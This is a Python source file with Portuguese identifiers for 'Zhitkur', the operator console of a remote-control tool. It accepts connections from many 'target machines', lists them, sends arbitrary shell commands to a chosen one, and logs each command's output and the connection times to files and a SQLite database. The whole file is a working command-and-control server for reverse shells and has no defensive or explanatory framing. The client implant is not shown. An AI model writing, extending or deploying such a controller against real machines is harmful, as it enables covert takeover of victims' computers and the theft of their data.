import socket
import threading
import sys
import sqlite3
from datetime import datetime
import os

def ajuda_controle():
    print("""
Comandos disponiveis:
\tAjuda -> Mostra todos os comandos disponiveis
\tControlar -> Escolhe um dos aparelhos online para controlar
\tAparelhos online -> Mostra todos aparelhos online
\tFechar conexoes -> Fecha todas as conexoes disponiveis""")

def ajuda_manipulando():
    print("""
\tDetalhes da maquina -> Recebe todos os detalhes da maquina alvo
\tDetalhes do python -> Recebe todos os detalhes do python instalado na maquina alvo
\tSair -> Sai do controle da maquina, mas não finaliza conexao
\tFechar conexao -> Finaliza conexao com a maquina""")

def salvar_arquivo(mensagem,dir):
    if(os.path.isdir('registros/')):
        if(os.path.isdir('registros/{}/'.format(dir))):
            if(os.path.isfile('registros/{}/{}.txt'.format(dir,dir))):
                arquivo = open('registros/{}/{}.txt'.format(dir,dir),'a')
                arquivo.writelines(mensagem)
                arquivo.close()
            else:
                arquivo = open('registros/{}/{}.txt'.format(dir,dir),'w')
                arquivo.writelines(mensagem)
                arquivo.close()
        else:
            os.mkdir('registros/{}/'.format(dir))
            arquivo = open('registros/{}/{}.txt'.format(dir,dir),'w')
            arquivo.writelines(mensagem)
            arquivo.close()
    else:
        os.mkdir('registros/')
        os.mkdir('registros/{}/'.format(dir))
        arquivo = open('registros/{}/{}.txt'.format(dir,dir),'w')
        arquivo.writelines(mensagem)
        arquivo.close()

def manipulando(conn,addr):
    print("\nConectado com sucesso em {}".format(addr))
    while True:
        shell_ = str(input("\nZhitkur:{} >>> ".format(addr)))

        if(shell_.upper() == "SAIR"):
            print("\n{} Está em standby".format(addr))
            break

        elif(shell_.upper() == "FECHAR CONEXAO"):
            print("\nConexao encerrada com {}".format(addr))
            conn.close()
            break

        elif(shell_.upper() == "AJUDA"):
            ajuda_manipulando()

        else:
            conn.send(shell_.encode())
            output = conn.recv(2048)
            output_ = "\nOutput do comando: {}{}".format(shell_,output.decode())
            print("\n{}".format(output.decode()))
            salvar_arquivo(output_,addr)

def controle():
    while True:
        shell = str(input("\nZhitkur >>> "))

        if(shell.upper() == "AJUDA"):
            ajuda_controle()

        elif(shell.upper() == "CONTROLAR"):
            print("\nAparelhos disponiveis para controle: ")
            indice = 0
            for addr in lista_addr:
                print("\t{}: {}".format(indice,addr))
                indice += 1
            escolha = int(input("Digite o indice do aparelho que deseja controlar: "))
            manipulando(lista_clientes[escolha],lista_addr[escolha])

        elif(shell.upper() == "APARELHOS ONLINE"):
            print("\nAparelhos conectados na rede:")
            for addr in lista_addr:
                print(addr)

        elif(shell.upper() == "FECHAR CONEXOES"):
            for clientes in lista_clientes:
                clientes.close()
        else:
            mensagem = "\nComando nao reconhecido no sistema, tente novamente"
            print(mensagem)

lista_clientes = []
lista_addr = []

servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
Ip = "127.0.0.1"
Porta = 3333
servidor.bind((Ip,Porta))
servidor.listen(100)

estado = True

while estado:
    db = sqlite3.connect('database.db')
    cursor = db.cursor()

    conn, addr = servidor.accept()
    now = datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")

    lista_clientes.append(conn)
    lista_addr.append(addr[0])

    cursor.execute("""
    INSERT INTO conexoes (conn, addr, horario)
    VALUES (?,?,?)""", (str(conn), str(addr), str(dt_string)))
    db.commit()
    db.close()

    print("{} se conectou".format(addr[0]))
    if(len(lista_clientes) == 1):
        processo = threading.Thread(target=controle, args=())
        processo.start()
